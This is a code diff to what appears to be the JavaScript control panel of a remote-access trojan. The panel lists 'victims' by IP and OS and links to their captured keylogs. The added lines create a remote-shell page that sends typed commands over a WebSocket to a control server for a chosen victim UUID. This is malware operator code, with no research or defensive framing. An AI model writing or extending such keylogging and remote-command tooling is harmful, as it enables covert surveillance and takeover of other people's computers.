@@ -42,6 +42,7 @@ let createDashboard = ()=>{
         $("#v_IP").html(data.data[0].IP)
         $("#v_OS").html(data.data[0].OS)
         $("#keylog_btn").attr("href",`./keylogs.html?UUID=${UUID}`)
+        $("#shell_btn").attr("href",`./shell.html?UUID=${UUID}`)
     })
     .fail(()=>{
         alert(`Victim with ${UUID} not found!`)
@@ -81,4 +82,29 @@ let fetchKeylogs = ()=>{
 
         $("#keylogs_data").html(html)
     })
+}
+
+//shell command 
+let shell_command = ()=>{
+    serverID = "4a32dr2dcs3d2dss3ce"
+    let UUID = location.search.split('UUID=')[1]
+    let ws = new WebSocket(`ws://127.0.0.1:8000/ws/server/${serverID}/`)
+
+    $("#shell_input").keyup(function(event) {
+        if (event.keyCode === 13) {
+            cmd = $("#shell_input").val()
+            data = {
+                id:UUID,
+                command:cmd,
+                type:"server"
+            }
+            console.log(data)
+            ws.send(JSON.stringify(data))
+            $("#shell_input").val("")
+        }
+    });
+
+    ws.onmessage=(msg)=>{
+        console.log(msg.data)
+    }
 }
